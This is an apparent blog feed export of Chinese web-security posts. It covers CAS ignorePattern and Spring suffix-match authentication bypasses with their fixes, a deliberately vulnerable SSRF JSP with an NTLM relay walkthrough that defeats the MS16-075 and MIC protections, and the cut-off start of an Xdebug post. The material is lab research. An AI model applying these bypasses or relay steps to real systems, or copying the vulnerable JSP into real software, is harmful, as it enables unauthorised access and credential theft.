<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/api/admin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/api/guest这个是公共页面，所有人都可以看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuestController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping(&quot;/api/guest&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">guest</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;hello guest&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设此程序的技术比较老旧，为了实现上面这种需求，那么开发可能会在web.xml中这么配置。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://battags.ad.ess.rutgers.edu:8443/cas<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://www.acme-client.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/api/guest<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样配置看起来似乎没有问题<br>
<img src="20210510105915-b44b6e76-b13b-1.png" alt="image.png"></p>
<h3 id="利用">利用</h3>
<p>但是其实可以被花式绕过。</p>
<p><img src="20210510105932-bea9e8de-b13b-1.png" alt="image.png"></p>
<h3 id="原理">原理</h3>
<p>原因有两点，第一org.jasig.cas.client.authentication.AuthenticationFilter，在匹配时候获取了原生url（未处理…/），甚至包括<code>?</code> 后的内容。</p>
<p><img src="20210510105946-c6c565ca-b13b-1.png" alt="image.png"></p>
<p>第二，filter的匹配模式有四种，默认是按正则匹配。<br>
<img src="20210510105953-cb7b4b34-b13b-1.png" alt="image.png"></p>
<p><img src="20210510110002-d0cd2f3a-b13b-1.png" alt="image.png"></p>
<p>同理如果配置成CONTAINS也会有类似的问题。</p>
<p>同理封装了这个库的三方库也会有问题，比较流行的是**<a href="https://github.com/Unicon/cas-client-autoconfig-support">cas-client-autoconfig-support</a>**  ，它常与springboot集成使用，如果有如下配置也会出问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas.ignorePattern=/api/guest</span><br></pre></td></tr></table></figure>
<h3 id="修复">修复</h3>
<p>所以正确的配置应该改为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>^/api/guest$<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>个人认为这个可以算洞（没处理…/而且contains这种选项就不应该存在），也可以甩锅给开发没仔细看文档。</p>
<h2 id="bypass-trick2-useSuffixPatternMatch">bypass trick2 useSuffixPatternMatch</h2>
<h3 id="场景-2">场景</h3>
<p>这里假设/admin系列的路由都不允许访问。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">            value = &#123;&quot;/admin&quot;&#125;,</span></span><br><span class="line"><span class="meta">            method = &#123;RequestMethod.GET&#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">            value = &#123;&quot;/admin/api&quot;&#125;,</span></span><br><span class="line"><span class="meta">            method = &#123;RequestMethod.GET&#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">admin1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello admin1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一次开发认真看了文档做了以下配置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.CasClientConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.EnableCasClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> today.redteam.aop.CasAspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCasClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CasConfig</span> <span class="keyword">extends</span> <span class="title class_">CasClientConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CasConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureAuthenticationFilter</span><span class="params">(FilterRegistrationBean authenticationFilter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.configureAuthenticationFilter(authenticationFilter);</span><br><span class="line">        authenticationFilter.addUrlPatterns(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/admin/*&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.serverUrlPrefix&quot;</span>, <span class="string">&quot;https://cashost.com/cas&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.serverLoginUrl&quot;</span>, <span class="string">&quot;https://cashost.com/cas/login&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.clientHostUrl&quot;</span>, <span class="string">&quot;http://localhost:8888/&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;cas.validationType&quot;</span>, <span class="string">&quot;CAS&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>/admin这个路由看起来似乎也没有什么问题。</p>
<p><img src="20210510110128-03982a3c-b13c-1.png" alt="image.png"></p>
<p>常规的绕过方式也不起作用<br>
<img src="20210510110137-08f100da-b13c-1.png" alt="image.png"></p>
<p><img src="20210510110143-0cb5c50c-b13c-1.png" alt="image.png"></p>
<h3 id="利用-2">利用</h3>
<p>但在低版本的springboot上还是能绕过（本地环境是1.5.9.RELEASE）。</p>
<p><img src="20210510110208-1bc8fab4-b13c-1.png" alt="image.png"></p>
<h3 id="原理-2">原理</h3>
<p>原理是在springboot 1.x中useSuffixPatternMatch默认为true，springboot会对路由进行正则匹配。</p>
<p>断点下在org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPattern。</p>
<p><img src="20210510110222-23f07f6e-b13c-1.png" alt="image.png"></p>
<p>/admin.*自然能匹配上/admin.也就绕过了。</p>
<h3 id="修复-2">修复</h3>
<p>如下关闭setUseSuffixPatternMatch或升级到2.x</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HandlerMapping <span class="title function_">requestMappingHandlerMapping</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingHandlerMapping</span>();</span><br><span class="line">        mapping.setUseSuffixPatternMatch(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> mapping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Using Java&#39;s SSRF vulnerability rce via ntlm relay</title>
    <url>/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/</url>
    <content><![CDATA[<!-- 绕过 MS16-075 和 MIC校验进行ntlm relay -->
<!-- more -->
<h2 id="环境搭建">环境搭建</h2>
<p>实验室环境说明<br>
• 6.1.7601 Service Pack 1 Build 7601<br>
• jdk1.7.0_80<br>
• 工作组环境</p>
<p>实验代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLConnection&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">ssrf</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;ssrf&quot;</span>);</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(ssrf);</span><br><span class="line">    <span class="type">URLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line">    connection.setRequestProperty(<span class="string">&quot;user-agent&quot;</span>, <span class="string">&quot;javasec&quot;</span>);</span><br><span class="line">    connection.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.connect();</span><br><span class="line">    connection.getHeaderFields();</span><br><span class="line">    connection.getInputStream();</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">resp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        resp.append(<span class="string">&quot;/n&quot;</span>).append(line);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.print(resp.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞复现">漏洞复现</h2>
<p>使用<a href="https://github.com/5alt/ultrarelay">ultrarelay</a>监听端口，访问url <code>http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1</code>触发ssrf漏洞时可以看到已经把受害机的ntlm hash拿到了。<br>
<img src="./1576766596365.png" alt="Alt text"></p>
<h2 id="原理分析">原理分析</h2>
<p>本质上就是一次从http到smb跨协议ntlm relay本机，但是我们知道在 MS16-075之后微软修复了http-&gt;smb的本机relay。所以为了绕过这个限制需要将type2(NTLMSSP_CHALLENGE)Negotiate Flags中的0x00004000设置为0，但是设置为0后会出现另外一个问题那就是MIC验证会不通过，为了绕过这个限制又需要把type2 Negotiate Flags中的Negotiate Always Sign设置为0。</p>
<p>响应victim401并开启ntlm认证<br>
<img src="./1576766618381.png" alt="Alt text"></p>
<p>victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker<br>
<img src="./1576766644960.png" alt="Alt text"></p>
<p>hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim<br>
<img src="./1576766672332.png" alt="Alt text"></p>
<p>victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker<br>
<img src="./1576766704445.png" alt="Alt text"></p>
<p>hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victim，重点就在这步在给victim的http应答中将0x00004000和Negotiate Always Sign都设置为了0。<br>
<img src="./1576766730695.png" alt="Alt text"></p>
<p>victim-&gt; http NTLMSSP_AUTH -&gt;hacker<br>
<img src="./1576766771275.png" alt="Alt text"></p>
<p>hacker-&gt; smb NTLMSSP_AUTH -&gt;victim<br>
<img src="./1576766793902.png" alt="Alt text"></p>
<p>后面认证成功后，响应victim 404，并连接victim的IPC$进行后续rce操作。<br>
<img src="./1576766820232.png" alt="Alt text"></p>
<h2 id="成功条件">成功条件</h2>
<p>• http-&gt;smb未打新补丁<br>
• 工作条件环境下需要administrator（sid 500）<br>
• 一个ssrf或者xxe的点</p>
<h2 id="参考">参考</h2>
<p>Ntlm Relay is dead, Long Live Ntlm Relay<br>
Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know<br>
ntlmrelay</p>
]]></content>
      <categories>
        <category>windows security</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Why did I buy INTC stock in Sep 2024</title>
    <url>/2024/09/29/Why-did-I-buy-INTC-stock-in-Sep-2024/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f91a0365cfb00ed02a30097fbfc10f44eed43ee42d34eec548b11021124d900d">f8c89326e2dd27398d7b0a10fab7ffc5bbe7003240d706b98f5c34f6af465a7f8b3722f5e90c29961d9f8f4a455241c4eed99ab7cd5987b8f0a9067048b30b04c0b9a6295fb86caeb7d1d9e3a0112d8d59aa86ecd9b0603fe8d84b64dfce1a3e651275e60c7e4fa376d1bd526063a70980dafceeb4e29d78fda5a669b3996005eb2d7739aea79a60d429433b53c60827b2fc416ead2dc73148b8e2606c9f96abcc78124ecd5b69bd86f63826b10aca639969c64271c2bfbb1dbed0edf14173f84b4c3a087bfbbd465e717d123df0afe2bd1db5870294f0fae9b309f3b6f948ebf321d14e1f8c7e91f1ef8f3d9b5e768af2c8512a2fab7c7d44fc29426d5818a14aea29e97954e617b8d7f705751cda575131dbfa0b82b990d2898408e3eb6271066ab13bc9cdeb878e871254a3dffc4b9fde45c4a834ca0218757593f900a7444dab788047fe61b6d64e38f9f37a69f5b881f24739bf2c66e7c4c7203fd9b7430ca5da00b89e66ee2c73afaa9c504477ff019853fa1f43a9e9a93f03d9ea2520fc539fc2683e0083c12a604a9b17fdbcef47371963a30a2df713f3c09945bcaa812c12cf2da0a434bfe39d0b7862fbc66aeffcb3f2597027a5255560f40599a7a2f16881428185f74a4a34e45753306a7b3edfe855d6b2bce59a477cd96a311d8b2e35db05b60b531a2c3d2f9f72c2aa0ff4f5c5838cdb269b75d530452fdd1830002de35f4efa5788ad40f1e1cdeb7a24f34fd6e6615e0e9488897c921afc4dfbe9e6acd47465c98f55b5a0aadb3561b1ae68c4be148544515531a77b9e5487e7fdeb4998b5b6741fe99ac6cad33bfd5f8a898c2d07e01413fdcd1593095dccfecb5fd7607b99d2779f4cf0a985bba498c648de8444c0607a6b6d53b879be85f730e2e8b047741c2d5f78917bc53360b068460032d24213812a91ac5bdd0086b6bd6aeefdb069fbd13cb8545b9997f5e43e770822a6603c7bd9872a4de2ae3fc55e70814281d15cf866ec1fa4b1cf25a53b10ad1304a66a99ab5ebc23a89a70711a38bb9f35f747dc3c21a7802b2e3a601d76d55875afaa2bcc067f933130b821ee200adf86d6d3eea16a1dfd185b89012ebabce2df02f793e3f049adad72d1fa472fb2ee0af68aaa359ce8d66c7baba0b7e610ca147ff867cd8a091fce9ccdcbf4e17009eb0fe558c19e0082ddf7775ad9f9d2e63cfd72f07ae7cda3cfa3f7efa95962a083c5ed5855e81bfd1aeeeca167532f737496d60e5ff3ef7835c455f8d65fe07537cb34bb1c648b179f73980bd2fb3db117c8311452fb4f871822c1a9985a849a84d6667f974539fb4b759b6e77470c51a26cbb087f31ca381d3e04795b41fee495e599b49c80603c0197c0824112b2ebf03ba174734d392087de7e19c8a9d7566e441bc949dba6f5cd2e7300aede46822bf35d57f958cfc2300ee180e9480ecbdb9b9bdc2b5fb21c1ea26286105a436d9c087d721dda8587fa3c9420870b7d70ff90a6622b88ce774a4236ef073003c2ca8920c28676c3a7ad58412f2a56f5910e2479627bbb7232075d1221ff3720103b531f28976be17795bad46b76041c1a74f30dfabbb5f24fdfa99d270d5243e699d4a272280d0cea33bdb24a58e73dd5258593a5734ec275939c97c493cd6ba3425a4f9231c8d83fdddbad7b1fd562d857889d13145b314c88a9f6695e652035f790df3e88d0fefe6cf27717b413949a58c0040fbd9ae5129bf96c9320f2b0341c47e3752b4fe55ed658af81d4a129043d29ac6fa2a79e81343b3efc508ccf1cf63a92da16c56a78fb03d76b4950e630f0e11cbb2eb99e13d3a15c3359429cee52fab0bc11116b5bc05166b55e21c7c7978c10ef2ae009a4ef308ee2ff719d93afd8525a33af60dd8995c0a6389e46b7cc1e7ea86fee79d6c6ded61511b65958ee58e4e170048ac658ab7efa0d82f60059821d1080dde1f09a73b1b36337106fd8e8ec2ed761e2f8d7f96c411174fda6e83ea503885c87d17523f83b581bad9246a0d4d7b346148209499678ce9d9d4445ef0c9d663534216c526d7a3d2d95c51e53f9736d54cb04b27af90d1e07a8fa2bc02e664153058ae35e8ce14c93826625b8e5c93b382ef207e4dfebc3f9b7577bd0182694c8023876cd1e4d1d2d4f70f1894458badac5d27da515e4d17c2659346ddf54c46eaef9831309823a3a8f84dd88135c852855f4d8836a434763e63489d1c0a7aaa61f1f8215fc7445e6998e84e43afed36443ae779d969c63a243013dbef5688ba1e24736febfc2bb73409844824e5a1b2fa6658db873e83882d738b9a729288d96087ad4944247e6420e4eb75b136cf62d06895cbb0310ba0b8c7c8495ba5a82128c7240768fac5f173745936c0c5f2dc2d80a7e64b69b54007b41d2ebec6d3370350daa9bcdf8d571013c975676f472fafbc854510a3ca536f9f49bf4631a6112c8322cbdf1ec3d904e36f42de766a792bb959b2d4709bd278d66a20a0cd0b821a49233d3f231432f67b925307db3c482deb1f1cd4f78ceb361e36247037b59ae85ff8d35759310d4004c25aa2facbbf31dd0534ce3fc1baa051f7fda4b86c2c2fc56213e9bd897e21036f29b42e11b0100f4e27cb9ea3fff117fe5683cd08c0032be29316f97a5a4c7ec1baf8933ff76b7e8639882f335469b54b61f316e1d14bf1a8908c859ab0f35debbfe25b44e0d992d86f769688315e5a10a9540ed92ea55688b558adff5983a1e316a59d5eff6f27a20103077cd90084fe33bfe79a0e78b080bf64442a753418af2c4525bad263eb299486d5d372d08a19d536a5ec5f2e659f5a1d1524049cefb1b2e759f9cb119b34ad15f9ff24a8a7c682bd9bae71d541701086e2c6c21f8c55b2aba81950b93cce49ee62ae1a1d546434fee3f1458b5358107bc41a0f4db8b504879bd18ace3a63196ecf689b88b7e478bb324304b4991b42f12bb2ae75d67b102b8981683e7b48b770eadaa533a438a7ea214585aa480d93ef26d22bd015f6015200a54fbf45125934b78d70d61163a36705ddc96ecb82088cea429bb6a40db48a25e8fea59c3b2ad66f2117a4a9e99765e4997b9f2c5f4982a7c1106b5ee9da43832c277948ad1d998ee220a3f1c1d376386c6f918011085239581fb22971754cc7f32fa3946ac806f2b262647d2ace6492ddf888bea885b4871ad610d36d573e6290ce469cc55bb1eda0a7a423620460e57732411b533cb4052cf6553037daaf9be68ffb6518b87d53ae9858eb2c2911fcc4f29b56dcdc2a6f4a72058324a7a1c86acfd84b8c14ebcaa9061ce2feea681ace77a4dbdbd686584fe64b6dc1e98039def942a342e1355062aa78f9bcc164f5a24b3bad96c06672d4b8c22c0348e568d239c6c03ec7ecb19dccc0e5478c33c331cf74769d0234ad20ec37834c635bd78cd23eca1c5aa24511fbbb10ec204aa8bec716859fa297fda81350212776e4339b6f8c37462139324eb622a604e8a056f66f90a7f0418815d1653ad8be3f34a5b7c1cd3b11b9c988669904ac03b3233e8088254e3c0b7a1aa05af00f0869472f9a656437357a4c64d47f2519c17c839694dfb628ab2a2df904230b4598024a84c05ba30282f778e8826dc9f8f8f6673a7773562dea91ebe1e6a7a5e0e0b073a00667fc2d8001346b0f76746fc0f40f0831c5e7ef0fbefc1e9e68caff76a39ab8ac77c0506d872399c9c541804fbfb91876e5a6aa63d93b5e24ae327e5ac03c94b0e51611ffd6da1ab149483c5b1e14679d964e7a8064e2648a6910c2b4c9eff3bc661030da674f5a137d65635c39fee12030d8e0380c648a4474eeb49740ab2366d5351c396d4f6ec86d8f43fb00218e1a16f5f5a98c34ca3e2d162910091bef0e80f701a97d819821194b7f81a36948522d4d7839de368d75b9238979d0c8d2c38d2294536876a0e166618fede2092b2b5fdc6bc30591449b8be7d4917282426176afa6b1f495e6d145948e8c94553c655a7899afc4df69494bd4b15424f4463673734cdef7471fc8c6b88b7ad8d0243405ef48e3ce488d8eb35fa8408bd9098b2141c158739414df8d31503b939ea55259c28e0aeb9bfd8bfab8b2cb51a86c34c7d87fc14e1f5ec4ba2a60ed9cf6b4b5ef5bda1783a7b8c708e95fa8a9d5d728fb1cdc77753212b94c16d679e302c6c30dbda4a18bb50b4ed8eda7fdd16f73e4830739624a0c7dcdb5af9c563e02c99e906a6ff3f69a7a271a2b4b3e6a65abcd0f4e76557e362bb347c23b7f7425874a7443a707fb370649aee0f50af59b870971fa0e0317781</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>stock</tag>
      </tags>
  </entry>
  <entry>
    <title>Xdebug原理学习及其攻击面复现</title>
    <url>/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- 攻击思路来自 rr师傅，记得那年师傅的博客叫初心を忘れず -->
<!-- more -->
<h2 id="通信过程">通信过程</h2>
<p>Xdebug的工作原理可以总结为下面几个步骤</p>
<ol>
<li>
<p>IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议</p>
</li>
<li>
<p>浏览器向Httpd服务器发送一个带有XDEBUG_SESSION_START参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理</p>
</li>
<li>
<p>Php（有Xdebug的拓展）看到这个请求是带了XDEBUG_SESSION_START 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。</p>
</li>
<li>
<p>Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。</p>
</li>
<li>
<p>Xdebug开始过滤代码，Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策。</p>
</li>
<li>
<p>相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。</p>
</li>
</ol>
<p>实际过程中的抓包如图<br>
<img src="1.png" alt="1.png"></p>
<p>当链接建立成功的时候php端会[PSH，ACK]</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;iso-8859-1&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:debugger_protocol_v1&quot;</span> <span class="attr">xmlns:xdebug</span>=<span class="string">&quot;http://xdebug.org/dbgp/xdebug&quot;</span> <span class="attr">fileuri</span>=<span class="string">&quot;file:///var/www/html/test1.php&quot;</span> <span class="attr">language</span>=<span class="string">&quot;PHP&quot;</span> <span class="attr">xdebug:language_version</span>=<span class="string">&quot;7.0.22-2&quot;</span> <span class="attr">protocol_version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">appid</span>=<span class="string">&quot;2000&quot;</span> <span 